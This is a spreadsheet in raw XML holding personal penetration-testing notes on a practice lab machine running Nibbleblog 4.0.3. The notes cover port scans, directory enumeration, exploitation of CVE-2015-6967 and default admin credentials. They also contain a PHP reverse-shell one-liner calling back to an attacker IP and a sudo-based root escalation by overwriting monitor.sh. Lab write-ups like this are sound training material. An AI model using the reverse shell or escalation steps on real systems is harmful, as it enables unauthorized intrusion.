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13_ncr:1_{8CBCE786-AC29-4997-988F-9D0FF39B8125}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Command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D5" i="3" l="1"/>
  <c r="D3" i="3"/>
  <c r="C2" i="3"/>
  <c r="C3" i="3"/>
  <c r="C4" i="3"/>
  <c r="C5" i="3"/>
  <c r="C6" i="3"/>
  <c r="C7" i="3"/>
  <c r="C8" i="3"/>
  <c r="C9" i="3"/>
  <c r="C10" i="3"/>
  <c r="C11" i="3"/>
  <c r="C12" i="3"/>
  <c r="C13" i="3"/>
  <c r="C14" i="3"/>
  <c r="C15" i="3"/>
  <c r="C16" i="3"/>
  <c r="C17" i="3"/>
  <c r="C18" i="3"/>
  <c r="C19" i="3"/>
  <c r="C20" i="3"/>
  <c r="C21" i="3"/>
  <c r="C22" i="3"/>
  <c r="C23" i="3"/>
  <c r="D4" i="3"/>
  <c r="D6" i="3"/>
  <c r="D7" i="3"/>
  <c r="D8" i="3"/>
  <c r="D9" i="3"/>
  <c r="D10" i="3"/>
  <c r="D11" i="3"/>
  <c r="D12" i="3"/>
  <c r="D13" i="3"/>
  <c r="D14" i="3"/>
  <c r="D15" i="3"/>
  <c r="D16" i="3"/>
  <c r="D17" i="3"/>
  <c r="D18" i="3"/>
  <c r="D19" i="3"/>
  <c r="D20" i="3"/>
  <c r="D21" i="3"/>
  <c r="D22" i="3"/>
  <c r="D23" i="3"/>
  <c r="D2" i="3"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="117" uniqueCount="79">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>awk '{print $NF}' dirsearch_output.txt</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>TCP</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Linux 3.X|4.X</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">22/tcp open  ssh     </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>OpenSSH 7.2p2</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">80/tcp open  http    </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Apache httpd 2.4.18</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)</t>
    </r>
  </si>
  <si>
    <t>/nibbleblog/</t>
  </si>
  <si>
    <t>Hello world page. There is a note in source code.
&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>vim dirsearch_output.txt</t>
  </si>
  <si>
    <t>awk -F' - ' '{split($1,a," ");split($3,b,"  -&gt;");gsub(/^[ \t]+|[ \t]+$/,"",b[1]);print a[2],b[1]}'</t>
  </si>
  <si>
    <t>awk -F' - ' '{split($1,a," ");split($3,b,"  -&gt;");gsub(/^[ \t]+|[ \t]+$/,"",b[1]);print a[2],b[1]}' dirsearch_output.txt</t>
  </si>
  <si>
    <t>301 /nibbleblog/admin</t>
  </si>
  <si>
    <t>200 /nibbleblog/admin.php</t>
  </si>
  <si>
    <t>200 /nibbleblog/admin/</t>
  </si>
  <si>
    <t>200 /nibbleblog/admin/js/tinymce/</t>
  </si>
  <si>
    <t>301 /nibbleblog/admin/js/tinymce</t>
  </si>
  <si>
    <t>301 /nibbleblog/content</t>
  </si>
  <si>
    <t>200 /nibbleblog/content/</t>
  </si>
  <si>
    <t>200 /nibbleblog/COPYRIGHT.txt</t>
  </si>
  <si>
    <t>200 /nibbleblog/index.php</t>
  </si>
  <si>
    <t>200 /nibbleblog/index.php/login/</t>
  </si>
  <si>
    <t>200 /nibbleblog/install.php</t>
  </si>
  <si>
    <t>200 /nibbleblog/install.php?profile=default</t>
  </si>
  <si>
    <t>301 /nibbleblog/languages</t>
  </si>
  <si>
    <t>200 /nibbleblog/LICENSE.txt</t>
  </si>
  <si>
    <t>301 /nibbleblog/plugins</t>
  </si>
  <si>
    <t>200 /nibbleblog/plugins/</t>
  </si>
  <si>
    <t>200 /nibbleblog/README</t>
  </si>
  <si>
    <t>200 /nibbleblog/themes/</t>
  </si>
  <si>
    <t>301 /nibbleblog/themes</t>
  </si>
  <si>
    <t>200 /nibbleblog/update.php</t>
  </si>
  <si>
    <t>200 /index.html</t>
  </si>
  <si>
    <t>200 /nibbleblog/</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>#=MID($B2,FIND(" ",$B2)+1,LEN($B2))</t>
  </si>
  <si>
    <t>#=LEFT($B2,FIND(" ",$B2)-1)</t>
  </si>
  <si>
    <t>Directory</t>
  </si>
  <si>
    <t>Same as above. Duplicate.</t>
  </si>
  <si>
    <r>
      <t>Clicking through those categories on the side updates variables. /nibbleblog/index.php?controller=blog&amp;action=view&amp;</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>category=uncategorised</t>
    </r>
  </si>
  <si>
    <t>php -r '$sock=fsockopen("[attack IP]",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</t>
  </si>
  <si>
    <t xml:space="preserve">https://github.com/hadrian3689/nibbleblog_4.0.3
https://www.cvedetails.com/cve/CVE-2015-6967/
https://github.com/dix0nym/CVE-2015-6967.git
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
</t>
  </si>
  <si>
    <t>Python shell upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
stty rows 40 cols 120</t>
  </si>
  <si>
    <t>nibbler</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Looks like a DB on here with config.xml and comments.xml
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Nibbleblog 4.0.3</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> "Coffee" ©2009 - 2014 | Developed by </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Diego Najar
</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Oh note</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> based on the version looks like there is a vulnerability</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">. I think I need to check if I have login capability.
Looks like </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>CVE-2015-6967</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>. So file upload to My Image plugin. Uploading with executable extension, then accessing it via request to the file. Looking at exploit, looks like python script does that and uploads a php shell. Kind of a weak exploit but let me try it out.
So it worked I just want to know if I can upload my own PHP shell. Going to try another upload exploit by dix0nym. Looks like I can upload my own custom shell.
Going to msfconsole. Honestly I'm trying to avoid reading through doing it manually. If it comes to it I will. Path of least resistance.
Ok so I just reused hadian3689 exploit and upgraded the shell.
Sweet upgraded shell to Python.</t>
    </r>
  </si>
  <si>
    <t>Files</t>
  </si>
  <si>
    <t>personal.zip
monitor.sh</t>
  </si>
  <si>
    <t>https://github.com/atarallo/TECMINT_MONITOR</t>
  </si>
  <si>
    <t>find / -iname monitor.sh 2&gt;/dev/null</t>
  </si>
  <si>
    <t>User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh</t>
  </si>
  <si>
    <t>#!/bin/bash
/bin/bash -p</t>
  </si>
  <si>
    <t>chmod 755 monitor.sh</t>
  </si>
  <si>
    <t>sudo /home/nibbler/personal/stuff/monitor.sh</t>
  </si>
  <si>
    <t>sudo -l</t>
  </si>
  <si>
    <t>ps aux | grep root</t>
  </si>
  <si>
    <t>Landed here. /var/www/html/nibbleblog/content/private/plugins/my_image
1 file in users home directory. Also user flag. 08ce9c18ee384c76467b041abc9637d0
zip file contains monitor.sh script.I'm sure this is used for priv escalation.
So looks like that file is system monitoring? Currently only instance of it is in my current directory.
Is this something root       1043  0.0  0.0  13376   172 ?        Ss   09:33   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pi
Lol sudo -l. Okay I'm going to run the file replace it with a shell. Overwrite monitor.sh.
Nice got root.
267cde21b6def8c455073894ec8c9d00</t>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>http://[victim IP]/</t>
  </si>
  <si>
    <t>Login page
Whoops I got blacklisted! Machine reset. New IP [victim IP].
Got spoiled but default is admin:nibbles. Going to try this out after resetting the box. Sick of AI on search engines. Going to turn it off when I do boxes.
Yeah that worked. I'm going to just try running the exploit and see if it works.</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -v [victim IP]</t>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://[victim IP] </t>
  </si>
  <si>
    <t>python3 dirsearch.py -u http://[victim IP] -i 200-299,300-399</t>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://[victim IP]/nibbleblog -i 200-299,300-399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</si>
</sst>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sz val="8"/>
      <name val="Aptos Narrow"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="1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0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="4"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github.com/hadrian3689/nibbleblog_4.0.3"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github.com/atarallo/TECMINT_MONITOR"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7C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:H3"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0">
      <selection activeCell="C20" sqref="C20"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="11.6640625" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="29.109375" style="2" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.109375" style="2" customWidth="1"/>
    <col min="4" max="4" width="10.33203125" style="2" customWidth="1"/>
    <col min="5" max="5" width="14.21875" style="2" customWidth="1"/>
    <col min="6" max="6" width="55" style="2" customWidth="1"/>
    <col min="7" max="7" width="63" style="2" customWidth="1"/>
    <col min="8" max="8" width="52.21875" style="2" customWidth="1"/>
    <col min="9" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>18</v>
      </c>
      <c r="D2" s="2">
        <v>22</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>13</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="3" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>71</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>18</v>
      </c>
      <c r="D3" s="2">
        <v>80</v>
      </c>
      <c r="E3" s="2" t="s">
        <v>13</v>
      </c>
      <c r="F3" s="2" t="s">
        <v>20</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>21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FB5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:G23"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E23" sqref="E23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="23.44140625" style="1" customWidth="1"/>
    <col min="2" max="2" width="39.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="18.5546875" style="2" customWidth="1"/>
    <col min="4" max="4" width="34.33203125" style="2" customWidth="1"/>
    <col min="5" max="5" width="64" style="1" customWidth="1"/>
    <col min="6" max="6" width="50.21875" style="1" customWidth="1"/>
    <col min="7" max="7" width="49.44140625" style="1" customWidth="1"/>
    <col min="8" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:7" s="3" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>49</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>23</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="E1" s="3" t="s">
        <v>5</v>
      </c>
      <c r="F1" s="3" t="s">
        <v>10</v>
      </c>
      <c r="G1" s="3" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>47</v>
      </c>
      <c r="C2" s="2" t="str">
        <f>LEFT($B2,FIND(" ",$B2)-1)</f>
        <v>200</v>
      </c>
      <c r="D2" s="2" t="str">
        <f>MID($B2,FIND(" ",$B2)+1,LEN($B2))</f>
        <v>/index.html</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>22</v>
      </c>
      <c r="F2" s="5"/>
    </row>
    <row r="3" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>48</v>
      </c>
      <c r="C3" s="2" t="str">
        <f t="shared" ref="C3:C23" si="0">LEFT($B3,FIND(" ",$B3)-1)</f>
        <v>200</v>
      </c>
      <c r="D3" s="2" t="str">
        <f>MID($B3,FIND(" ",$B3)+1,LEN($B3))</f>
        <v>/nibbleblog/</v>
      </c>
      <c r="E3" s="2" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="4" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>27</v>
      </c>
      <c r="C4" s="2" t="str">
        <f t="shared" si="0"/>
        <v>301</v>
      </c>
      <c r="D4" s="2" t="str">
        <f t="shared" ref="D4:D23" si="1">MID($B4,FIND(" ",$B4)+1,LEN($B4))</f>
        <v>/nibbleblog/admin</v>
      </c>
      <c r="E4" s="1" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="5" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>28</v>
      </c>
      <c r="C5" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D5" s="2" t="str">
        <f>MID($B5,FIND(" ",$B5)+1,LEN($B5))</f>
        <v>/nibbleblog/admin.php</v>
      </c>
      <c r="E5" s="4" t="s">
        <v>73</v>
      </c>
    </row>
    <row r="6" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>29</v>
      </c>
      <c r="C6" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D6" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/admin/</v>
      </c>
      <c r="E6" s="1" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="7" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B7" s="2" t="s">
        <v>30</v>
      </c>
      <c r="C7" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D7" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/admin/js/tinymce/</v>
      </c>
      <c r="E7" s="1" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="8" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B8" s="2" t="s">
        <v>31</v>
      </c>
      <c r="C8" s="2" t="str">
        <f t="shared" si="0"/>
        <v>301</v>
      </c>
      <c r="D8" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/admin/js/tinymce</v>
      </c>
      <c r="E8" s="1" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="9" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B9" s="2" t="s">
        <v>32</v>
      </c>
      <c r="C9" s="2" t="str">
        <f t="shared" si="0"/>
        <v>301</v>
      </c>
      <c r="D9" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/content</v>
      </c>
      <c r="E9" s="1" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="10" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B10" s="2" t="s">
        <v>33</v>
      </c>
      <c r="C10" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D10" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/content/</v>
      </c>
      <c r="E10" s="1" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="11" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>34</v>
      </c>
      <c r="C11" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D11" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/COPYRIGHT.txt</v>
      </c>
    </row>
    <row r="12" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B12" s="2" t="s">
        <v>35</v>
      </c>
      <c r="C12" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D12" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/index.php</v>
      </c>
    </row>
    <row r="13" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B13" s="2" t="s">
        <v>36</v>
      </c>
      <c r="C13" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D13" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/index.php/login/</v>
      </c>
    </row>
    <row r="14" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B14" s="2" t="s">
        <v>37</v>
      </c>
      <c r="C14" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D14" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/install.php</v>
      </c>
    </row>
    <row r="15" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B15" s="2" t="s">
        <v>38</v>
      </c>
      <c r="C15" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D15" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/install.php?profile=default</v>
      </c>
    </row>
    <row r="16" spans="1:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B16" s="2" t="s">
        <v>39</v>
      </c>
      <c r="C16" s="2" t="str">
        <f t="shared" si="0"/>
        <v>301</v>
      </c>
      <c r="D16" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/languages</v>
      </c>
    </row>
    <row r="17" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B17" s="2" t="s">
        <v>40</v>
      </c>
      <c r="C17" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D17" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/LICENSE.txt</v>
      </c>
    </row>
    <row r="18" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B18" s="2" t="s">
        <v>41</v>
      </c>
      <c r="C18" s="2" t="str">
        <f t="shared" si="0"/>
        <v>301</v>
      </c>
      <c r="D18" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/plugins</v>
      </c>
    </row>
    <row r="19" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B19" s="2" t="s">
        <v>42</v>
      </c>
      <c r="C19" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D19" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/plugins/</v>
      </c>
    </row>
    <row r="20" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B20" s="2" t="s">
        <v>43</v>
      </c>
      <c r="C20" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D20" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/README</v>
      </c>
    </row>
    <row r="21" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B21" s="2" t="s">
        <v>44</v>
      </c>
      <c r="C21" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D21" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/themes/</v>
      </c>
    </row>
    <row r="22" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B22" s="2" t="s">
        <v>45</v>
      </c>
      <c r="C22" s="2" t="str">
        <f t="shared" si="0"/>
        <v>301</v>
      </c>
      <c r="D22" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/themes</v>
      </c>
    </row>
    <row r="23" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1" t="s">
        <v>72</v>
      </c>
      <c r="B23" s="2" t="s">
        <v>46</v>
      </c>
      <c r="C23" s="2" t="str">
        <f t="shared" si="0"/>
        <v>200</v>
      </c>
      <c r="D23" s="2" t="str">
        <f t="shared" si="1"/>
        <v>/nibbleblog/update.php</v>
      </c>
      <c r="E23" s="2" t="s">
        <v>59</v>
      </c>
      <c r="F23" s="6" t="s">
        <v>56</v>
      </c>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="F23" r:id="rId1" display="https://github.com/hadrian3689/nibbleblog_4.0.3" xr:uid="{0E16AC28-4B46-4A9A-A5DA-4B6403924722}"/>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E3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K2"/>
  <sheetViews>
    <sheetView topLeftCell="E1" workbookViewId="0">
      <selection activeCell="H24" sqref="H24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="11.6640625" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="12.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="10.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="11.5546875" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" bestFit="1" customWidth="1"/>
    <col min="6" max="6" width="33.77734375" style="2" customWidth="1"/>
    <col min="7" max="7" width="25.109375" style="2" customWidth="1"/>
    <col min="8" max="8" width="69.44140625" style="2" customWidth="1"/>
    <col min="9" max="10" width="33.44140625" style="2" customWidth="1"/>
    <col min="11" max="11" width="33.77734375" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
